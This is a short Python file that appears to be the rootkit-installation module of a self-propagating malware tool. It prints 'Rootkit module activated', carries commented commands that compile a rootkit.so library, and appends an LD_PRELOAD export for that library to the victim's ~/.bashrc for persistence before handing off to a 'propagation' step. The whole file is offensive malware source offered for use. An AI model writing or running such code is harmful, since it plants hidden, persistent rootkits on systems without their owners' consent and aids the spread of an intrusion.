###########################################################################################################################
####################################################     LIBRARIES     ####################################################
###########################################################################################################################

from pathlib import Path
import subprocess
from pathlib import Path

###########################################################################################################################
#################################################     INITIALIZATIONS     #################################################
###########################################################################################################################

def exec_bash(cmd, output=True):
    return subprocess.check_output(cmd, shell=True)

###########################################################################################################################
#####################################################     PROGRAM     #####################################################
###########################################################################################################################

def run():
    next_action = ""
    data = "no_data"
    print("[+] Rootkit module activated...")

    # exec_bash("gcc -fPIC -shared -o ./utils/rootkit.so ./utils/rootkit.c -ldl")
    # exec_bash("export LD_PRELOAD=./utils/rootkit.so")

    # path of the current file
    file_path = Path(__file__).resolve()
    # Directory of the current file
    dir_path = file_path.parent
    print(dir_path)

    subprocess.run(f"echo 'export LD_PRELOAD={dir_path}/../utils/rootkit.so'>> ~/.bashrc && source ~/.bashrc")
    # subprocess.run("export LD_PRELOAD=./utils/rootkit.so ps", shell=True)

    next_action = "propagation"
    return data, next_action

if __name__ == '__main__':
    run()